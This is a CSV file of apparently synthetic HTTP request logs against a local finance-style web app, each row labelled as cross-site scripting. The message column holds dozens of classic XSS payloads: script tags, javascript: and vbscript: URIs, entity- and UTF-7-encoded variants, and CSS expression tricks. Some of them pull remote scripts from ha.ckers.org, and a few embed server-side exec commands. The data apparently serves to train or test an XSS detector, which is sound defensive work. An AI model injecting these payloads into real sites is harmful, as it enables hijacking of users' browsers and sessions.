mimetype,timestamp,request_uri,user_ip,content_length,request_type,user_agent,message,is_xss
"text/html, image/png, */*",5263297940484691640,http://127.0.0.1:5000/invest/t42ldd3v,10.255.185.6,56759,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577","exp/*<;XSS STYLE=';no\xss:noxss("";*//*"";);",true
"image/jpeg, image/png, application/json, */*",4841305254886786541,http://127.0.0.1:5000/stock/16y8ld9o,10.241.132.187,15104,GET,Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1),"<;STYLE>;li {list-style-image: url("";javascript:alert(&#39;XSS&#39;)"";);}<;/STYLE>;<;UL>;<;LI>;XSS",true
"text/html, application/json, image/jpeg, */*",9201686625508066321,http://127.0.0.1:5000/interest/jzzck1km,10.255.148.211,62511,POST,Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393,"<;IMG SRC=';vbscript:msgbox("";XSS"";)';>;",true
"text/plain, text/html, */*",8118376917196406757,http://127.0.0.1:5000/interest/knpeq2qu,172.20.43.83,29630,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931,"<;LAYER SRC="";http://ha.ckers.org/scriptlet.html"";>;<;/LAYER>;",true
"text/plain, image/jpeg, */*",1095162916378942794,http://127.0.0.1:5000/fund/grv0ykh0,10.142.168.33,52288,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577","<;IMG SRC="";livescript:[code]"";>;",true
"application/json, image/png, text/plain, image/jpeg, */*",4053137383646661590,http://127.0.0.1:5000/interest/do63y3bq,10.64.80.1,17538,GET,"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.461.0 Safari/534.3",%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,true
"image/jpeg, */*",5508673407603400019,http://127.0.0.1:5000/loan/cbn9dlwt,10.119.137.25,46388,POST,"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0","<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=javascript:alert(';XSS';);"";>;",true
"text/html, */*",5874411265989029065,http://127.0.0.1:5000/withdrawal/bqmg480z,10.2.220.41,52310,OPTIONS,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; tr) Opera 8.50,"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"";>;",true
"application/json, text/plain, image/jpeg, */*",7168712564575627803,http://127.0.0.1:5000/interest/e17ko1v0,10.7.167.224,98591,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586,"<;META HTTP-EQUIV="";refresh""; CONTENT="";0; URL=http://;URL=javascript:alert(';XSS';);"";>;",true
"image/jpeg, text/html, image/png, application/json, */*",7046992689085659293,http://127.0.0.1:5000/dividend/b7zrjm5v,10.60.185.234,31791,GET,Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393,"<;IMG SRC="";mocha:[code]"";>;",true
"text/plain, */*",7755060406370207271,http://127.0.0.1:5000/interest/3qeyvtic,10.147.21.236,881,GET,Opera/8.51 (Windows 98; U; en),"<;OBJECT TYPE="";text/x-scriptlet""; DATA="";http://ha.ckers.org/scriptlet.html"";>;<;/OBJECT>;",true
"image/png, text/plain, application/json, image/jpeg, */*",4538398928852781881,http://127.0.0.1:5000/credit/at7fhs25,172.24.202.150,85502,DELETE,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931,<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;,true
"text/plain, image/jpeg, image/png, */*",2086591803861790998,http://127.0.0.1:5000/mortgage/9doz4coy,10.253.212.182,48384,POST,"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10","<;EMBED SRC="";http://ha.ckers.org/xss.swf""; AllowScriptAccess="";always"";>;<;/EMBED>;",true
"image/png, application/json, text/html, text/plain, */*",2088313707097429302,http://127.0.0.1:5000/portfolio/xtpsu4zs,10.113.114.16,91409,POST,Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.6),"a="";get"";;&;#10;b="";URL("";"";;&;#10;c="";javascript:"";;&;#10;d="";alert(';XSS';);"";)"";;&#10;eval(a+b+c+d);",true
"text/plain, image/png, application/json, image/jpeg, */*",2121923148773980391,http://127.0.0.1:5000/stock/1su053it,10.243.11.47,48402,POST,Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10) Gecko/20050811 Firefox/1.0.6,"<;STYLE TYPE="";text/javascript"";>;alert(';XSS';);<;/STYLE>;",true
"image/jpeg, text/html, */*",8554369999438772154,http://127.0.0.1:5000/dividend/i4kt57lv,10.158.34.239,25358,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/523.3+ (KHTML, like Gecko) Version/3.0.3 Safari/522.12.1","<;IMG STYLE="";xss:expr/*XSS*/ession(alert(';XSS';))"";>;",true
"text/plain, application/json, */*",2948828514953670921,http://127.0.0.1:5000/interest/lcf60x1e,10.138.183.147,36521,POST,Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a1) Gecko/20060121 Firefox/1.6a1,"<;XSS STYLE="";xss:expression(alert(';XSS';))"";>;",true
"application/json, image/png, */*",1842924809492225729,http://127.0.0.1:5000/account/yi96xnea,10.124.241.92,19243,POST,Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2),"<;STYLE>;.XSS{background-image:url("";javascript:alert(';XSS';)"";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;",true
"image/png, */*",1352190712244142647,http://127.0.0.1:5000/equity/ix6ncb0a,10.221.189.202,98793,POST,Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint;PPC-i830; PPC; 240x320),"<;STYLE type="";text/css"";>;BODY{background:url("";javascript:alert(';XSS';)"";)}<;/STYLE>;",true
"text/html, image/png, application/json, text/plain, */*",8861909561490415152,http://127.0.0.1:5000/stock/h179c5l0,10.255.176.128,28974,POST,Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0),"<;LINK REL="";stylesheet""; HREF="";javascript:alert(';XSS';);"";>;",true
"image/png, image/jpeg, */*",3442753867252370948,http://127.0.0.1:5000/debit/2fbmz34x,172.29.81.28,2960,POST,Opera/7.11 (Windows NT 5.1; U)  [en],"<;LINK REL="";stylesheet""; HREF="";http://ha.ckers.org/xss.css"";>;",true
"text/html, */*",7091178565135055539,http://127.0.0.1:5000/credit/vxt2gy2d,10.141.177.135,42496,POST,Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1),<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;,true
"image/png, */*",8820884242512393120,http://127.0.0.1:5000/mortgage/wofdfi9y,10.127.53.25,48182,OPTIONS,Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1),"<;META HTTP-EQUIV="";Link""; Content="";<;http://ha.ckers.org/xss.css>;; REL=stylesheet"";>;",true
"application/json, text/html, image/png, image/jpeg, */*",6260905872765392142,http://127.0.0.1:5000/withdrawal/0i7vbpxc,10.251.214.207,11197,GET,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.1 (KHTML, like Gecko) Safari/125","<;STYLE>;BODY{-moz-binding:url("";http://ha.ckers.org/xssmoz.xml#xss"";)}<;/STYLE>;",true
"text/plain, application/json, image/jpeg, text/html, */*",3081013227417172393,http://127.0.0.1:5000/market/grfzfwau,10.49.121.20,78940,GET,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3","<;TABLE BACKGROUND="";javascript:alert(';XSS';)"";>;<;/TABLE>;",true
"application/json, image/png, */*",8837376462575822631,http://127.0.0.1:5000/account/9ir0jg3t,10.59.74.13,33748,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931,"<;TABLE>;<;TD BACKGROUND="";javascript:alert(';XSS';)"";>;<;/TD>;<;/TABLE>;",true
"text/html, image/jpeg, image/png, */*",6966368318729981484,http://127.0.0.1:5000/loan/88v3v6kr,10.200.234.112,75293,POST,"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.1 (KHTML, like Gecko) Chrome/2.0.164.0 Safari/530.1",<;HTML xmlns:xss>;,true
"image/png, text/plain, image/jpeg, */*",331634374654218526,http://127.0.0.1:5000/interest/zgob5z5i,10.13.125.129,13635,POST,Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.0.10) Gecko/20070409 CentOS/1.5.0.10-2.el5.centos Firefox/1.5.0.10,"<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC="";javas]]>;<;![CDATA[cript:alert(';XSS';);"";>;]]>;",true
"text/plain, text/html, */*",3429207414391730693,http://127.0.0.1:5000/stock/pipt30z2,10.20.113.57,51196,GET,Mozilla/4.0 (MSIE 6.0; Windows NT 5.1),"<;XML ID="";xss"";>;<;I>;<;B>;<;IMG SRC="";javas<;!-- -->;cript:alert(';XSS';)"";>;<;/B>;<;/I>;<;/XML>;",true
"text/plain, application/json, image/jpeg, text/html, */*",4418289915199289427,http://127.0.0.1:5000/debit/6obrrhk1,10.248.40.5,86677,POST,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2","<;XML SRC="";http://ha.ckers.org/xsstest.xml""; ID=I>;<;/XML>;",true
"text/html, image/png, text/plain, application/json, */*",8031149575531585668,http://127.0.0.1:5000/deposit/2ieho6ln,10.95.8.41,5715,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",<;HTML>;<;BODY>;,true
"image/png, application/json, */*",4446833617512275899,http://127.0.0.1:5000/transaction/53u64v5x,10.240.157.158,51669,POST,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.23  [de],<;!--[if gte IE 4]>;           ,true
"application/json, */*",6111054723289780727,http://127.0.0.1:5000/credit/w927vm0i,10.203.158.17,47756,GET,Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.0.0),"<;META HTTP-EQUIV="";Set-Cookie""; Content="";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;"";>;",true
"application/json, */*",7943353864483468579,http://127.0.0.1:5000/fund/43nmk0sh,10.186.168.126,45838,POST,Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),"<;XSS STYLE="";behavior: url(http://ha.ckers.org/xss.htc);"";>;",true
"text/html, */*",3469611541012433503,http://127.0.0.1:5000/transaction/qph17bnm,10.121.103.37,49499,POST,Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.14) Gecko/20080417 Firefox/2.0.0.14,"<;SCRIPT SRC="";http://ha.ckers.org/xss.jpg"";>;<;/SCRIPT>;",true
"image/png, application/json, */*",7760802895475679210,http://127.0.0.1:5000/capital/jr5g40d1,10.40.73.126,43575,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","<;!--#exec cmd="";/bin/echo ';<;SCRIPT SRC';"";-->;<;!--#exec cmd="";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';"";-->;",true
"image/jpeg, image/png, */*",1361370831329601174,http://127.0.0.1:5000/deposit/lxm85o56,10.230.8.102,60139,POST,"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.803.0 Chrome/14.0.803.0 Safari/535.1",<;? echo(';<;SCR)';;,true
"image/jpeg, image/png, application/json, text/html, */*",5430294225807287564,http://127.0.0.1:5000/interest/34ro6oup,172.25.165.11,70004,POST,Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 4.1.8.0),"<;BR SIZE="";&;{alert(';XSS';)}"";>;",true
"application/json, */*",1877407053256928423,http://127.0.0.1:5000/account/q65v7tfc,10.149.223.70,84776,PUT,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0",<;IMG SRC=JaVaScRiPt:alert(';XSS';)>;,true
"application/json, text/html, text/plain, image/jpeg, */*",8937290141861691230,http://127.0.0.1:5000/capital/ydj6xfya,10.142.102.160,6791,GET,Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0),<;IMG SRC=javascript:alert(&;quot;XSS&;quot;)>;,true
"text/plain, image/png, application/json, */*",4219618568376599298,http://127.0.0.1:5000/stock/5avqnte8,10.250.142.103,12396,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586,"<;IMG SRC=`javascript:alert("";RSnake says, ';XSS';"";)`>;",true
"image/png, image/jpeg, */*",4214448276436510242,http://127.0.0.1:5000/invest/7qbkkpot,10.49.252.47,34099,POST,Mozilla/5.0 (X11; U; Linux x86_64; el-GR; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10,"<;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>;",true
"application/json, */*",4913093767330762887,http://127.0.0.1:5000/transaction/tl06u2uy,10.139.214.252,8892,POST,Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.06  [de],<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;,true
"image/png, text/plain, application/json, */*",4176223323754928818,http://127.0.0.1:5000/transaction/ox7564ai,10.68.221.99,89382,PUT,"Mozilla/5.0 (Windows; U; Windows NT 6.0; de-DE) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;,true
"text/html, image/png, image/jpeg, text/plain, */*",4739722094251255801,http://127.0.0.1:5000/invest/7jbg6uv3,10.49.159.33,11471,GET,"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-TW) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10","<;DIV STYLE="";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029"";>;",true
"text/plain, text/html, image/png, */*",177373070700400982,http://127.0.0.1:5000/credit/6kkdmt6y,10.105.37.210,31804,POST,Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.01  [en],<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;,true
"image/png, */*",3188694260337013461,http://127.0.0.1:5000/withdrawal/zi6giopq,10.196.136.50,54204,POST,Opera/9.25 (Windows NT 5.1; U; MEGAUPLOAD 1.0; pt-br),"<;HEAD>;<;META HTTP-EQUIV="";CONTENT-TYPE""; CONTENT="";text/html; charset=UTF-7"";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-",true
"text/plain, */*",5664655856194089010,http://127.0.0.1:5000/mortgage/u4pf546f,10.152.248.166,14083,POST,Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; FDM),"\"";;alert(';XSS';);//",true
"image/jpeg, text/plain, application/json, image/png, */*",8706344221484230352,http://127.0.0.1:5000/market/n7p85fqz,10.238.218.24,74059,POST,Opera/9.52 (X11; Linux x86_64; U),"<;/TITLE>;<;SCRIPT>;alert(""XSS"");<;/SCRIPT>;",true
"text/html, text/plain, */*",7955021369444453949,http://127.0.0.1:5000/debit/37yaa118,10.232.251.200,41815,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR) AppleWebKit/525+ (KHTML, like Gecko) Version/3.0 Safari/523.15","<;STYLE>;@im\port';\ja\vasc\ript:alert("";XSS"";)';;<;/STYLE>;",true
"text/html, application/json, text/plain, image/jpeg, */*",9173904940759320499,http://127.0.0.1:5000/withdrawal/94p4w5p3,10.118.87.48,21434,POST,Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint;PPC-i830; PPC; 240x320),"<;IMG SRC="";jav&#x09;ascript:alert(';XSS';);"";>;",true
"image/jpeg, application/json, text/html, */*",2646508427262557086,http://127.0.0.1:5000/loan/5plcmdgg,10.31.177.10,47099,GET,"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.498.0 Safari/534.6","<;IMG SRC="";jav&;#x09;ascript:alert(';XSS';);"";>;",true
"application/json, text/html, */*",2948629303650957992,http://127.0.0.1:5000/fund/mgzykim8,10.153.218.81,81045,POST,Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/5.0.1,"<;IMG SRC="";jav&;#x0A;ascript:alert(';XSS';);"";>;",true
"application/json, text/html, */*",7937772201105284942,http://127.0.0.1:5000/capital/wey8j832,10.219.170.230,58864,GET,"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1","<;IMG SRC="";jav&;#x0D;ascript:alert(';XSS';);"";>;",true
"image/png, application/json, image/jpeg, text/plain, */*",6101728673514442358,http://127.0.0.1:5000/loan/cf844gqa,10.99.139.24,51459,GET,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr) AppleWebKit/416.11 (KHTML, like Gecko) Safari/416.12","<;IMG&#x0D;SRC&#x0D;=&#x0D;"";&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;&#x0D;';&#x0D;X&#x0D;S&#x0D;S&#x0D;';&#x0D;)&#x0D;"";&#x0D;>;&#x0D;",true
"text/plain, image/jpeg, */*",2096479365522736712,http://127.0.0.1:5000/dividend/f9qe1ftp,10.204.52.162,10414,OPTIONS,Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130401 Firefox/21.0,"perl -e ';print "";<;IM SRC=java\0script:alert("";XSS"";)>"";;';>; out",true
"image/png, text/html, application/json, */*",3225430764300131402,http://127.0.0.1:5000/interest/30ibvlui,172.27.22.164,99233,GET,Opera/8.01 (Macintosh; PPC Mac OS X; U; en),"perl -e ';print "";&;<;SCR\0IPT>;alert("";XSS"";)<;/SCR\0IPT>;"";;'; >; out",true
"image/png, image/jpeg, text/html, application/json, */*",4368634126618858952,http://127.0.0.1:5000/balance/spilsq63,10.218.97.66,1783,DELETE,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","<;IMG SRC=""; &;#14;  javascript:alert(';XSS';);"";>;",true
"image/png, application/json, */*",5926972084832297193,http://127.0.0.1:5000/invest/tg7h9ojy,10.101.255.14,42858,PUT,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6","<;SCRIPT/XSS SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",true
"image/png, text/plain, application/json, */*",7606002497757807886,http://127.0.0.1:5000/invest/olxv6k9q,10.82.228.34,50731,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0","<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert("";XSS"";)>;",true
"application/json, image/jpeg, image/png, */*",2715203228385659982,http://127.0.0.1:5000/withdrawal/ed8kritl,10.220.26.232,96892,DELETE,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",<;SCRIPT SRC=http://ha.ckers.org/xss.js,true
"image/jpeg, text/html, application/json, image/png, */*",4393564020178175572,http://127.0.0.1:5000/loan/4b9av53v,10.106.108.172,55589,GET,Mozilla/5.0 (Windows 98; U; en) Opera 8.54,<;SCRIPT SRC=//ha.ckers.org/.j>;,true
"text/plain, */*",7151695856142708165,http://127.0.0.1:5000/stock/bxp7zucc,10.170.108.169,34798,POST,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6","<;IMG SRC="";javascript:alert(';XSS';)"";",true
"text/html, image/png, */*",1999562267676565966,http://127.0.0.1:5000/capital/51xbsbft,10.210.11.93,15819,POST,Opera/9.61 (X11; Linux i686; U; de) Presto/2.1.1,<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;,true
"image/png, image/jpeg, */*",1794637817344901709,http://127.0.0.1:5000/portfolio/atwugbxe,10.229.206.81,25865,POST,Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; PPC),"<;<;SCRIPT>;alert("";XSS"";);//<;<;/SCRIPT>;",true
"image/jpeg, text/plain, */*",3191059782817371063,http://127.0.0.1:5000/interest/no6za78x,10.225.28.76,86049,DELETE,Opera/6.04 (Windows 2000; U)  [de],"<;IMG "";"";"";>;<;SCRIPT>;alert("";XSS"";)<;/SCRIPT>;"";>;",true
"text/plain, image/jpeg, */*",5749169548626666831,http://127.0.0.1:5000/market/af12w02x,10.206.250.51,58230,GET,"Mozilla/5.0 (Windows; U; Windows NT 6.0; nl) AppleWebKit/522.11.3 (KHTML, like Gecko) Version/3.0 Safari/522.11.3",<;SCRIPT>;a=/XSS/,true
"text/html, text/plain, application/json, image/png, */*",7326576363210802543,http://127.0.0.1:5000/transaction/rbmy95jx,10.193.7.132,89354,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","<;SCRIPT a="";>;""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",true
"application/json, */*",143350185692632915,http://127.0.0.1:5000/dividend/3vx4kf1b,10.174.227.61,3565,POST,Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0),"<;SCRIPT ="";blah""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",true
"text/plain, image/jpeg, */*",1015324509990960828,http://127.0.0.1:5000/credit/o3efgscy,10.152.105.167,94121,GET,Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6; yplus 1.0),"<;SCRIPT a="";blah""; ';'; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",true
